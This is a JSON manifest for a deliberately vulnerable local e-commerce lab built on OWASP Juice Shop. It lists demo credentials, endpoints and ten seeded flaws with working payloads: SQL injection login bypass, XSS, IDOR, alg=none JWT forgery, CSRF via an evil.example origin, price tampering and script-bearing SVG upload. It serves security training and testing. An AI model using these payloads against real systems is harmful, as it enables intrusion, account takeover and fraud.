@@ -1,0 +1,929 @@
+{
+  "schemaVersion": "1.0.0",
+  "generatedAt": "2026-10-22T14:55:00+08:00",
+  "target": {
+    "name": "星澜优选 / StellarPick",
+    "baseUrl": "http://127.0.0.1:8081",
+    "routing": "Angular hash routing (/#/...)",
+    "base": "OWASP Juice Shop v20.4.0-SNAPSHOT (Angular 22)",
+    "nodeEnv": "stellarpick",
+    "listen": "127.0.0.1:8081 (single process; SQLite must not be opened by a second server)",
+    "config": "vendor/juice-shop/config/stellarpick.yml",
+    "database": "vendor/juice-shop/data/juiceshop.sqlite",
+    "runtimeState": "vendor/juice-shop/data/lab-runtime.json",
+    "uploads": "vendor/juice-shop/uploads/",
+    "health": "GET /healthz",
+    "notes": [
+      "All accounts, products, orders, tickets and merchants are fictional demo data.",
+      "The lab route layer is vendor/juice-shop/routes/stellarpick.ts; operations live in routes/lab.ts.",
+      "Only one Node process may serve 8081 because SQLite is a single-writer file database."
+    ]
+  },
+  "reset": {
+    "soft": {
+      "request": "POST /lab/reset?confirm=1",
+      "clears": [
+        "lab orders (back to 1001-1010)",
+        "carts",
+        "tickets and ticket messages",
+        "uploads/",
+        "authenticatedUsers token/id maps"
+      ],
+      "keeps": [
+        "SQLite products",
+        "SQLite users and e-mail changes",
+        "lab-runtime.json is rewritten with seed state"
+      ],
+      "note": "Use this between demo runs when you only need a clean order/cart/upload state."
+    },
+    "hard": {
+      "commands": [
+        "Stop the 8081 Node process first.",
+        "npm run reset   # deletes vendor/juice-shop/data/juiceshop.sqlite* and vendor/juice-shop/uploads/*",
+        "Remove-Item vendor/juice-shop/data/lab-runtime.json -Force -ErrorAction SilentlyContinue",
+        "npm start       # datacreator recreates SQLite and the 20 visible + 1 hidden products"
+      ],
+      "clears": [
+        "SQLite database (products/users/orders-in-DB)",
+        "uploads",
+        "lab runtime orders/carts/tickets"
+      ],
+      "note": "reset.ps1 alone does not delete data/lab-runtime.json, so persisted lab orders would survive a restart."
+    },
+    "perVulnerability": {
+      "V01": "Read-only; no reset required.",
+      "V02": "Read-only; no reset required.",
+      "V03": "Read-only; the payload lives only in the URL.",
+      "V04": "Adds a review to product 1003. Reviews live in the in-memory review store and disappear on process restart; reset.ps1 does not clear them.",
+      "V05": "Read-only; no reset required.",
+      "V06": "Read-only; no reset required.",
+      "V07": "Client-side only; remove localStorage['token'] or log in again.",
+      "V08": "Changes Alice's e-mail in SQLite. Restore with POST /api/account/email {email:'alice@stellarpick.example'} (Bearer) or run the hard reset.",
+      "V09": "Creates a new order (id 2000-2899) in lab-runtime.json and clears Alice's cart. Use POST /lab/reset?confirm=1 to remove it.",
+      "V10": "Writes an .svg into uploads/. Use POST /lab/reset?confirm=1 or delete uploads/."
+    }
+  },
+  "accounts": [
+    {
+      "id": 1,
+      "email": "admin@stellarpick.example",
+      "password": "admin123",
+      "role": "admin",
+      "dbId": 1,
+      "labUserId": 1,
+      "canLogin": true,
+      "note": "Weak password, admin role. V02 returns this account."
+    },
+    {
+      "id": 26,
+      "email": "alice@stellarpick.example",
+      "password": "Alice@2026",
+      "role": "customer",
+      "dbId": 26,
+      "labUserId": 2,
+      "canLogin": true,
+      "note": "Primary member. Lab order ownerId is the historical seed id 2, not the DB id 26."
+    },
+    {
+      "id": 27,
+      "email": "bob@stellarpick.example",
+      "password": "Bob@2026",
+      "role": "customer",
+      "dbId": 27,
+      "labUserId": 3,
+      "canLogin": true,
+      "note": "Second member; owns order 1002 (V05 target)."
+    },
+    {
+      "id": 28,
+      "email": "merchant@stellarpick.example",
+      "password": "Merchant@2026",
+      "role": "merchant",
+      "dbId": 28,
+      "labUserId": 4,
+      "canLogin": true,
+      "note": "Merchant dashboard demo account."
+    },
+    {
+      "id": 6,
+      "email": "support@stellarpick.example",
+      "password": "Support@2026",
+      "role": "support",
+      "dbId": 6,
+      "labUserId": 5,
+      "canLogin": true,
+      "note": "Support account."
+    },
+    {
+      "id": 2,
+      "email": "jim@stellarpick.example",
+      "password": "ncc-1701",
+      "role": "customer",
+      "dbId": 2,
+      "labUserId": null,
+      "canLogin": true,
+      "note": "Native Juice Shop account; author of the seeded review on product 1003."
+    },
+    {
+      "id": null,
+      "email": "carol@stellarpick.example",
+      "password": null,
+      "role": "member",
+      "dbId": null,
+      "labUserId": 6,
+      "canLogin": false,
+      "note": "Lab directory only (/api/admin/users); no SQLite login account."
+    },
+    {
+      "id": null,
+      "email": "dave@stellarpick.example",
+      "password": null,
+      "role": "member",
+      "dbId": null,
+      "labUserId": 7,
+      "canLogin": false,
+      "note": "Lab directory only; status=disabled."
+    },
+    {
+      "id": null,
+      "email": "erin@stellarpick.example",
+      "password": null,
+      "role": "member",
+      "dbId": null,
+      "labUserId": 8,
+      "canLogin": false,
+      "note": "Lab directory only; no SQLite login account."
+    }
+  ],
+  "data": {
+    "products": {
+      "visible": 20,
+      "total": 21,
+      "ids": "1001-1020",
+      "hidden": [
+        {
+          "id": 1021,
+          "name": "星澜隐藏礼盒（注入可见）",
+          "price": 0.01,
+          "image": "sp-1020.svg",
+          "deletedAt": "non-null",
+          "note": "Only reachable through the V01 UNION injection; search?q= never returns it."
+        }
+      ],
+      "categories": [
+        "kitchen 厨房",
+        "home 家居",
+        "personal 个护",
+        "digital 数码",
+        "travel 出行",
+        "food 食品"
+      ],
+      "notes": [
+        "The seed keeps 1005 and 1019 visible (datacreator deletes their deletedDate); only 1021 is soft-deleted by design.",
+        "/healthz reports products.visible=20, total=21, hidden=1."
+      ]
+    },
+    "orders": {
+      "seeded": 10,
+      "ids": "1001-1010",
+      "ownerCounts": {
+        "alice@stellarpick.example": 4,
+        "bob@stellarpick.example": 4,
+        "carol@stellarpick.example": 1,
+        "admin@stellarpick.example": 1
+      },
+      "aliceOrderIds": [
+        1001,
+        1003,
+        1005,
+        1007
+      ],
+      "target": {
+        "id": 1002,
+        "ownerId": 3,
+        "ownerName": "周远",
+        "ownerEmail": "bob@stellarpick.example",
+        "total": 556,
+        "status": "pending_shipment",
+        "items": "1003 x2 + 1012 x2"
+      },
+      "note": "GET /api/orders filters by the caller's e-mail/ownerId; GET /api/orders/:id does not check ownership (V05). V09 creates new orders, so Alice's list grows until POST /lab/reset?confirm=1 restores the 10 seed orders."
+    },
+    "labUsers": {
+      "count": 8,
+      "endpoint": "GET /api/admin/users",
+      "ids": "1-8",
+      "note": "Hard-coded demo directory, not the SQLite Users table."
+    },
+    "dbUsers": {
+      "seedApprox": 27,
+      "observed": 35,
+      "endpoint": "GET /api/Users (any logged-in user)",
+      "note": "Mutable: seeded from data/static/users.yml (ids are sparse, 14/chris.pike is absent) and grows when tests register accounts. Do not assert an exact DB count; V06 asserts the 8-row lab directory."
+    },
+    "tickets": {
+      "count": 3,
+      "ids": "1-3",
+      "endpoint": "GET /api/support/tickets"
+    },
+    "merchants": {
+      "count": 4,
+      "ids": "1-4",
+      "statuses": {
+        "1": "approved",
+        "2": "pending",
+        "3": "pending",
+        "4": "rejected"
+      }
+    },
+    "reviews": [
+      {
+        "productId": 1003,
+        "author": "jim@stellarpick.example",
+        "body": "在空间站值班时也能喝到热水，保温表现像曲速引擎一样稳定。",
+        "xss": false
+      },
+      {
+        "productId": 1007,
+        "author": "bender@stellarpick.example",
+        "body": "收起来只有一片，展开能塞下一整个机器人的零件。",
+        "xss": false
+      }
+    ],
+    "reviewNote": "V04 is write-based: the seeded reviews are benign. PUT /rest/products/1003/reviews adds the HTML payload; reviews disappear on process restart."
+  },
+  "endpoints": [
+    {
+      "method": "POST",
+      "path": "/rest/user/login",
+      "auth": "none",
+      "purpose": "Login (V02 SQL injection)",
+      "body": "{email,password}",
+      "note": "Returns {authentication:{token,bid,umail}} and sets sp_token (HttpOnly; Secure; SameSite=None)."
+    },
+    {
+      "method": "GET",
+      "path": "/rest/products/search?q=",
+      "auth": "none",
+      "purpose": "Product search (V01 SQL injection)",
+      "note": "String-concatenated SQL; returns {status,data}."
+    },
+    {
+      "method": "GET",
+      "path": "/rest/products/:id/reviews",
+      "auth": "none",
+      "purpose": "Product reviews"
+    },
+    {
+      "method": "PUT",
+      "path": "/rest/products/:id/reviews",
+      "auth": "none (native route accepts it)",
+      "purpose": "Create review (V04 stored XSS)",
+      "body": "{message,author}"
+    },
+    {
+      "method": "GET",
+      "path": "/api/orders",
+      "auth": "Bearer",
+      "purpose": "Caller's order list",
+      "note": "Filtered by ownerEmail/ownerId."
+    },
+    {
+      "method": "GET",
+      "path": "/api/orders/:id",
+      "auth": "Bearer",
+      "purpose": "Order detail (V05 IDOR)",
+      "note": "No ownership check."
+    },
+    {
+      "method": "POST",
+      "path": "/api/orders/:id/pay",
+      "auth": "Bearer",
+      "purpose": "Pay order"
+    },
+    {
+      "method": "POST",
+      "path": "/api/orders/:id/cancel",
+      "auth": "Bearer",
+      "purpose": "Cancel order"
+    },
+    {
+      "method": "POST",
+      "path": "/api/orders/:id/confirm",
+      "auth": "Bearer",
+      "purpose": "Confirm receipt"
+    },
+    {
+      "method": "GET",
+      "path": "/api/admin/users",
+      "auth": "Bearer (any logged-in user)",
+      "purpose": "Lab user directory (V06)",
+      "note": "Returns 8 hard-coded rows; no role check."
+    },
+    {
+      "method": "PATCH",
+      "path": "/api/admin/users/:id",
+      "auth": "Bearer (any logged-in user)",
+      "purpose": "Change role/status",
+      "body": "{role?,status?}"
+    },
+    {
+      "method": "POST",
+      "path": "/api/admin/users/:id/reset-password",
+      "auth": "Bearer (any logged-in user)",
+      "purpose": "Reset a demo password"
+    },
+    {
+      "method": "GET",
+      "path": "/api/admin/merchants",
+      "auth": "Bearer (any logged-in user)",
+      "purpose": "Merchant applications"
+    },
+    {
+      "method": "POST",
+      "path": "/api/admin/merchants/:id/approve",
+      "auth": "Bearer (any logged-in user)",
+      "purpose": "Approve merchant"
+    },
+    {
+      "method": "POST",
+      "path": "/api/admin/merchants/:id/reject",
+      "auth": "Bearer (any logged-in user)",
+      "purpose": "Reject merchant",
+      "body": "{reason}"
+    },
+    {
+      "method": "GET",
+      "path": "/api/admin/settings",
+      "auth": "Bearer + role=admin",
+      "purpose": "Admin settings (N06 control)",
+      "note": "403 for members, 200 for admin/forged admin token."
+    },
+    {
+      "method": "GET",
+      "path": "/api/cart",
+      "auth": "Bearer",
+      "purpose": "Cart"
+    },
+    {
+      "method": "POST",
+      "path": "/api/cart/items",
+      "auth": "Bearer",
+      "purpose": "Add to cart (V09)",
+      "body": "{productId,quantity,unitPrice}"
+    },
+    {
+      "method": "PATCH",
+      "path": "/api/cart/items/:id",
+      "auth": "Bearer",
+      "purpose": "Update quantity/unitPrice"
+    },
+    {
+      "method": "DELETE",
+      "path": "/api/cart/items/:id",
+      "auth": "Bearer",
+      "purpose": "Remove cart line",
+      "response": 204
+    },
+    {
+      "method": "POST",
+      "path": "/api/checkout",
+      "auth": "Bearer",
+      "purpose": "Create order from client prices (V09)",
+      "body": "{items:[{productId,title,image,unitPrice,quantity}],address?}"
+    },
+    {
+      "method": "POST",
+      "path": "/api/account/email",
+      "auth": "Bearer or sp_token cookie",
+      "purpose": "Change e-mail (V08 CSRF)",
+      "body": "{email} (JSON or urlencoded)",
+      "response": 204
+    },
+    {
+      "method": "POST",
+      "path": "/api/account/avatar",
+      "auth": "Bearer",
+      "purpose": "Avatar upload (V10)",
+      "body": "multipart/form-data field 'file'",
+      "note": "No extension/MIME validation; returns {url:'/uploads/...'}"
+    },
+    {
+      "method": "GET",
+      "path": "/api/addresses",
+      "auth": "Bearer",
+      "purpose": "Address book"
+    },
+    {
+      "method": "POST",
+      "path": "/api/addresses",
+      "auth": "Bearer",
+      "purpose": "Create address"
+    },
+    {
+      "method": "PATCH",
+      "path": "/api/addresses/:id",
+      "auth": "Bearer",
+      "purpose": "Update address"
+    },
+    {
+      "method": "DELETE",
+      "path": "/api/addresses/:id",
+      "auth": "Bearer",
+      "purpose": "Delete address",
+      "response": 204
+    },
+    {
+      "method": "GET",
+      "path": "/api/merchant/summary",
+      "auth": "Bearer",
+      "purpose": "Merchant dashboard stats"
+    },
+    {
+      "method": "GET",
+      "path": "/api/merchant/products",
+      "auth": "Bearer",
+      "purpose": "Merchant product list (20 visible)"
+    },
+    {
+      "method": "POST",
+      "path": "/api/merchant/products",
+      "auth": "Bearer",
+      "purpose": "Create product"
+    },
+    {
+      "method": "PATCH",
+      "path": "/api/merchant/products/:id",
+      "auth": "Bearer",
+      "purpose": "Update product/status"
+    },
+    {
+      "method": "GET",
+      "path": "/api/merchant/orders",
+      "auth": "Bearer",
+      "purpose": "All lab orders for the merchant view"
+    },
+    {
+      "method": "POST",
+      "path": "/api/merchant/orders/:id/ship",
+      "auth": "Bearer",
+      "purpose": "Ship a pending order",
+      "body": "{trackingNo}"
+    },
+    {
+      "method": "GET",
+      "path": "/api/support/tickets",
+      "auth": "Bearer",
+      "purpose": "Ticket list"
+    },
+    {
+      "method": "POST",
+      "path": "/api/support/tickets",
+      "auth": "Bearer",
+      "purpose": "Create ticket",
+      "body": "{subject,body}"
+    },
+    {
+      "method": "GET",
+      "path": "/api/support/tickets/:id",
+      "auth": "Bearer",
+      "purpose": "Ticket + messages"
+    },
+    {
+      "method": "POST",
+      "path": "/api/support/tickets/:id/messages",
+      "auth": "Bearer",
+      "purpose": "Reply",
+      "body": "{body}"
+    },
+    {
+      "method": "POST",
+      "path": "/api/support/tickets/:id/close",
+      "auth": "Bearer",
+      "purpose": "Close ticket"
+    },
+    {
+      "method": "GET",
+      "path": "/api/Users",
+      "auth": "Bearer (any logged-in user)",
+      "purpose": "SQLite user list",
+      "note": "Admin UI uses /api/admin/users; this endpoint returns the mutable SQLite user table (seed ~27, observed 35 after test registrations)."
+    },
+    {
+      "method": "GET",
+      "path": "/healthz",
+      "auth": "none",
+      "purpose": "Health probe",
+      "note": "Reports DB path, products {visible:20,total:21,hidden:1}, orders, carts, tickets, runtime file."
+    },
+    {
+      "method": "POST",
+      "path": "/lab/reset?confirm=1",
+      "auth": "none",
+      "purpose": "Soft reset",
+      "note": "Resets lab orders/carts/tickets/uploads/token maps; SQLite unchanged."
+    },
+    {
+      "method": "GET",
+      "path": "/lab/csrf.html",
+      "auth": "none",
+      "purpose": "V08 third-party CSRF demo page",
+      "note": "Auto-submits POST /api/account/email to 127.0.0.1:8081."
+    }
+  ],
+  "vulnerabilities": [
+    {
+      "id": "V01",
+      "title": "搜索 SQL 注入（UNION 读取隐藏商品）",
+      "category": "SQL Injection",
+      "owasp": "A03:2021 Injection",
+      "severity": "high",
+      "auth": "none",
+      "uiPath": "/#/search?q=",
+      "request": {
+        "method": "GET",
+        "path": "/rest/products/search",
+        "query": {
+          "q": "')) UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--"
+        }
+      },
+      "payload": "')) UNION SELECT * FROM Products WHERE deletedAt IS NOT NULL--",
+      "expected": {
+        "status": 200,
+        "assertions": [
+          "data.length == 21",
+          "data contains id 1021",
+          "id 1021 deletedAt != null"
+        ],
+        "evidence": "The hidden product 星澜隐藏礼盒（注入可见） (id 1021, price 0.01) appears in the response."
+      },
+      "errorEvidence": {
+        "query": "q=')",
+        "status": 500,
+        "title": "Error: SQLITE_ERROR: near \")\": syntax error",
+        "note": "A lone quote q=' returns 200 with an empty array; use q=') for the error-based evidence."
+      },
+      "negative": "N01",
+      "codeRef": "vendor/juice-shop/routes/search.ts:23",
+      "reset": "Read-only."
+    },
+    {
+      "id": "V02",
+      "title": "登录 SQL 注入（绕过密码）",
+      "category": "SQL Injection",
+      "owasp": "A03:2021 Injection",
+      "severity": "critical",
+      "auth": "none",
+      "uiPath": "/#/login",
+      "request": {
+        "method": "POST",
+        "path": "/rest/user/login",
+        "body": {
+          "email": "' OR 1=1--",
+          "password": "x"
+        }
+      },
+      "payload": "' OR 1=1--",
+      "expected": {
+        "status": 200,
+        "assertions": [
+          "authentication.token exists",
+          "JWT payload.data.id == 1",
+          "JWT payload.data.role == 'admin'",
+          "JWT payload.data.email == 'admin@stellarpick.example'"
+        ],
+        "evidence": "200 + admin JWT; the login page redirects and the header menu shows 平台管理员."
+      },
+      "negative": "N03",
+      "codeRef": "vendor/juice-shop/routes/login.ts:37",
+      "reset": "Read-only."
+    },
+    {
+      "id": "V03",
+      "title": "搜索结果头反射型 XSS",
+      "category": "Cross-site Scripting (reflected)",
+      "owasp": "A03:2021 Injection",
+      "severity": "medium",
+      "auth": "none",
+      "uiPath": "/#/search?q=",
+      "request": {
+        "method": "GET",
+        "path": "/#/search",
+        "query": {
+          "q": "<img src=x onerror=\"window.__v03=1\">"
+        }
+      },
+      "payload": "<img src=x onerror=\"window.__v03=1\">",
+      "expected": {
+        "status": 200,
+        "assertions": [
+          "window.__v03 === 1",
+          "h1.headline innerHTML contains onerror"
+        ],
+        "evidence": "The headline 关于「<img ...>」的 N 件商品 renders the raw payload and the handler runs."
+      },
+      "negative": "N02",
+      "codeRef": "vendor/juice-shop/frontend/src/app/stellarpick/features/catalog/search.page.ts:49",
+      "reset": "Read-only."
+    },
+    {
+      "id": "V04",
+      "title": "商品评价存储型 XSS",
+      "category": "Cross-site Scripting (stored)",
+      "owasp": "A03:2021 Injection",
+      "severity": "high",
+      "auth": "member (UI); the native PUT accepts unauthenticated requests",
+      "uiPath": "/#/product/1003 → 评价 tab (#tab-reviews)",
+      "request": {
+        "method": "PUT",
+        "path": "/rest/products/1003/reviews",
+        "body": {
+          "message": "<img src=x onerror=\"window.__v04=1\">很好用",
+          "author": "alice@stellarpick.example"
+        }
+      },
+      "payload": "<img src=x onerror=\"window.__v04=1\">很好用",
+      "expected": {
+        "status": 201,
+        "assertions": [
+          "PUT returns 201",
+          "after opening /#/product/1003 and clicking #tab-reviews, window.__v04 === 1"
+        ],
+        "evidence": "Review body is stored and rendered through bypassSecurityTrustHtml; the onerror handler executes."
+      },
+      "negative": "N02 (plain search does not execute)",
+      "codeRef": "vendor/juice-shop/frontend/src/app/stellarpick/features/catalog/product.page.ts:466 + product.page.html:279",
+      "reset": "Reviews are in-memory; restart the process. /lab/reset does not clear reviews."
+    },
+    {
+      "id": "V05",
+      "title": "订单详情水平越权（IDOR）",
+      "category": "Broken Access Control",
+      "owasp": "A01:2021 Broken Access Control",
+      "severity": "high",
+      "auth": "member (alice)",
+      "uiPath": "/#/account/orders/1002",
+      "request": {
+        "method": "GET",
+        "path": "/api/orders/1002",
+        "headers": {
+          "Authorization": "Bearer <alice>"
+        }
+      },
+      "payload": "order id 1002",
+      "expected": {
+        "status": 200,
+        "assertions": [
+          "ownerId == 3",
+          "ownerEmail == 'bob@stellarpick.example'",
+          "ownerName == '周远'",
+          "total == 556"
+        ],
+        "evidence": "Alice sees Bob's order and delivery address. GET /api/orders itself is filtered to Alice's 4 orders; only the detail endpoint is IDOR."
+      },
+      "negative": "N04",
+      "codeRef": "vendor/juice-shop/routes/stellarpick.ts:24-33",
+      "reset": "Read-only."
+    },
+    {
+      "id": "V06",
+      "title": "后台用户列表垂直越权",
+      "category": "Broken Access Control",
+      "owasp": "A01:2021 Broken Access Control",
+      "severity": "critical",
+      "auth": "any logged-in user",
+      "uiPath": "/#/admin/users",
+      "request": {
+        "method": "GET",
+        "path": "/api/admin/users",
+        "headers": {
+          "Authorization": "Bearer <alice>"
+        }
+      },
+      "payload": "none",
+      "expected": {
+        "status": 200,
+        "assertions": [
+          "total == 8",
+          "items.length == 8"
+        ],
+        "evidence": "Alice renders the admin user table. The 8 rows are the lab directory, not the 27 SQLite users."
+      },
+      "negative": "N05",
+      "codeRef": "vendor/juice-shop/routes/stellarpick.ts:80",
+      "reset": "Read-only."
+    },
+    {
+      "id": "V07",
+      "title": "JWT alg=none 伪造管理员",
+      "category": "Identification and Authentication Failures",
+      "owasp": "A07:2021 Identification and Authentication Failures",
+      "severity": "critical",
+      "auth": "none (client-side token)",
+      "uiPath": "localStorage['token'] → refresh → /#/admin",
+      "request": {
+        "method": "GET",
+        "path": "/api/admin/settings and /api/admin/users",
+        "headers": {
+          "Authorization": "Bearer <alg=none token>"
+        }
+      },
+      "payload": "base64url({alg:'none',typ:'JWT'}) + '.' + base64url({data:{id:1,role:'admin',email:'admin@stellarpick.example'}}) + '.'",
+      "expected": {
+        "status": 200,
+        "assertions": [
+          "/api/admin/settings == 200",
+          "/api/admin/users == 200",
+          "native /api/Users also == 200 (express-jwt 0.1.3 + jsonwebtoken 0.4.0 accept alg=none)"
+        ],
+        "evidence": "The header menu shows 平台后台 and both lab and native admin APIs accept the unsigned token."
+      },
+      "negative": "N06 (member without a forged token gets 403 on settings)",
+      "codeRef": "vendor/juice-shop/routes/stellarpick.ts:148-165 + vendor/juice-shop/lib/insecurity.ts:52",
+      "reset": "Remove localStorage['token'] or log in again."
+    },
+    {
+      "id": "V08",
+      "title": "改邮箱 CSRF（sp_token Cookie）",
+      "category": "Cross-Site Request Forgery",
+      "owasp": "A01:2021 Broken Access Control",
+      "severity": "medium",
+      "auth": "victim's sp_token cookie",
+      "uiPath": "/#/account/profile → 改邮箱；或 /lab/csrf.html",
+      "request": {
+        "method": "POST",
+        "path": "/api/account/email",
+        "headers": {
+          "Cookie": "sp_token=<alice>",
+          "Origin": "http://evil.example",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "email=csrf@example.com"
+      },
+      "payload": "email=csrf@example.com",
+      "expected": {
+        "status": 204,
+        "assertions": [
+          "no CSRF token",
+          "no Origin/Referer check",
+          "email actually changes",
+          "no session cookie → 401"
+        ],
+        "evidence": "Login sets sp_token (HttpOnly; Secure; SameSite=None). A page at http://localhost:8081/lab/csrf.html auto-submits the form to http://127.0.0.1:8081; Alice's e-mail changes (login with the new e-mail returns 200)."
+      },
+      "negative": "No cookie/Bearer → 401",
+      "codeRef": "vendor/juice-shop/routes/login.ts:28 + vendor/juice-shop/routes/stellarpick.ts:321-352",
+      "reset": "POST /api/account/email with Bearer and the original e-mail, or hard reset."
+    },
+    {
+      "id": "V09",
+      "title": "结算单价篡改（客户端 unitPrice）",
+      "category": "Business Logic",
+      "owasp": "A04:2021 Insecure Design",
+      "severity": "high",
+      "auth": "member (alice)",
+      "uiPath": "/#/cart → /#/checkout",
+      "request": {
+        "method": "POST",
+        "path": "/api/checkout",
+        "body": {
+          "items": [
+            {
+              "productId": 1003,
+              "unitPrice": 0.01,
+              "quantity": 1,
+              "title": "星澜 316 不锈钢保温杯 500ml",
+              "image": "sp-1003.svg"
+            }
+          ]
+        }
+      },
+      "payload": "unitPrice=0.01",
+      "expected": {
+        "status": 200,
+        "assertions": [
+          "cart total == 0.01",
+          "checkout total == 0.01",
+          "order detail total == 0.01"
+        ],
+        "evidence": "Order is created with total 0.01 instead of 129."
+      },
+      "negative": "none (business logic)",
+      "codeRef": "vendor/juice-shop/routes/stellarpick.ts:200-231 and 265-315",
+      "reset": "Creates an order (id 2000-2899) in lab-runtime.json; POST /lab/reset?confirm=1 removes it."
+    },
+    {
+      "id": "V10",
+      "title": "SVG 头像上传导致存储型 XSS",
+      "category": "Unrestricted Upload",
+      "owasp": "A05:2021 Security Misconfiguration",
+      "severity": "high",
+      "auth": "member (alice)",
+      "uiPath": "/#/account/profile → 头像上传",
+      "request": {
+        "method": "POST",
+        "path": "/api/account/avatar",
+        "body": "multipart/form-data: file=avatar.svg (image/svg+xml, contains <script>)"
+      },
+      "payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(\"V10\")</script></svg>",
+      "expected": {
+        "status": 200,
+        "assertions": [
+          "response.url starts with /uploads/",
+          "GET url returns 200",
+          "Content-Type includes image/svg+xml",
+          "body contains <script>"
+        ],
+        "evidence": "The uploaded SVG is served inline from the same origin and the script runs when opened directly."
+      },
+      "negative": "none (upload)",
+      "codeRef": "vendor/juice-shop/routes/stellarpick.ts:354-373",
+      "reset": "POST /lab/reset?confirm=1 or delete uploads/."
+    }
+  ],
+  "negatives": [
+    {
+      "id": "N01",
+      "request": "GET /rest/products/search?q=手机",
+      "expected": {
+        "status": 200,
+        "dataLength": ">0"
+      },
+      "why": "Normal Chinese keyword returns product 1012 and is not a SQL injection."
+    },
+    {
+      "id": "N02",
+      "request": "GET /#/search?q=hello",
+      "expected": {
+        "status": 200,
+        "dataLength": 0
+      },
+      "why": "Plain text does not execute; V03 requires an HTML payload."
+    },
+    {
+      "id": "N03",
+      "request": "POST /rest/user/login {alice@stellarpick.example, Alice@2026}",
+      "expected": {
+        "status": 200,
+        "token": true
+      },
+      "why": "Valid credentials work normally."
+    },
+    {
+      "id": "N04",
+      "request": "GET /api/orders/1001 (alice)",
+      "expected": {
+        "status": 200,
+        "ownerId": 2,
+        "ownerEmail": "alice@stellarpick.example"
+      },
+      "why": "Alice can read her own order; this is the control for V05."
+    },
+    {
+      "id": "N05",
+      "request": "GET /api/admin/users (no auth)",
+      "expected": {
+        "status": 401
+      },
+      "why": "The lab directory still requires a login."
+    },
+    {
+      "id": "N06",
+      "request": "GET /api/admin/settings (alice)",
+      "expected": {
+        "status": 403
+      },
+      "why": "The settings endpoint enforces role=admin."
+    },
+    {
+      "id": "N06-admin",
+      "request": "GET /api/admin/settings (admin)",
+      "expected": {
+        "status": 200,
+        "siteName": "星澜优选"
+      },
+      "why": "Positive control for N06."
+    }
+  ],
+  "verification": {
+    "commands": [
+      "cd T:\\StellarPick",
+      "$env:PATH='T:\\StellarPick\\tools\\node22;'+$env:PATH",
+      "npm run verify   # 10/10 + 7/7 + 18/18",
+      "npm run audit    # verify + a11y + perf + mobile; non-zero on failure",
+      "npm run audit:strict-a11y   # additionally fails on any serious axe finding"
+    ],
+    "expected": {
+      "verifyV": "SUMMARY 10 checks 0 failed",
+      "verifyNegative": "SUMMARY 7 checks 0 failed",
+      "smoke": "SUMMARY routes 18 bad 0",
+      "a11y": "scanned=54 failures=0 (27 routes x 2 widths)",
+      "perf": "PERF BUDGET OK; max LCP 548ms (budget 800ms); initial JS transfer 196.4KB (goal 200KB, budget 300KB); API p95 2-33ms",
+      "mobile": "26 checks (13 routes x 2 widths), 0 overflow, 0 console errors"
+    },
+    "notes": [
+      "verify-v mutates state: V08 changes and restores Alice's e-mail; V09 creates an order; V10 writes an upload. Use /lab/reset?confirm=1 for lab state and the hard reset for SQLite.",
+      "The service must be running on 127.0.0.1:8081 and be the only process using vendor/juice-shop/data/juiceshop.sqlite."
+    ]
+  }
+}
